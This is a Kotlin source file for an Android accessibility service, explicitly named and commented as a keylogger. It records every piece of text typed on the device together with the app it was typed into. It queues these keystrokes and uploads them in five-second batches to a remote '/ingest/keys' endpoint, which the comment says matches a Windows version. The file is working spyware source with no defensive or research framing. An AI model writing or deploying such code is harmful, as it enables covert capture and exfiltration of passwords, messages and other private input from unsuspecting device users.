package com.agent.service

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * Accessibility-based keylog. Captures typed text + foreground package name.
 * Posts in 5s batches to the same /ingest/keys contract as Windows.
 */
class KeylogService : AccessibilityService() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val queue = ConcurrentLinkedQueue<JSONObject>()
    private var currentPackage: String = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        startFlushLoop()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val e = event ?: return
        when (e.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                e.packageName?.let { currentPackage = it.toString() }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val pkg = e.packageName?.toString() ?: currentPackage
                val text = e.text?.joinToString("") ?: ""
                if (text.isEmpty()) return
                // diff-aware: only the tail typically changes; ship the whole change
                queue.add(JSONObject().apply {
                    put("k", text)
                    put("w", pkg)
                    put("t", System.currentTimeMillis() / 1000.0)
                })
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                e.packageName?.let { currentPackage = it.toString() }
            }
        }
    }

    private fun startFlushLoop() {
        scope.launch {
            while (true) {
                delay(5000)
                val batch = mutableListOf<JSONObject>()
                while (true) {
                    val item = queue.poll() ?: break
                    batch.add(item)
                }
                if (batch.isEmpty()) continue
                val payload = JSONObject().put("events", JSONArray().apply {
                    batch.forEach { put(it) }
                }).toString()
                ApiClient.postKeyEvents(payload)
            }
        }
    }

    override fun onInterrupt() { }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
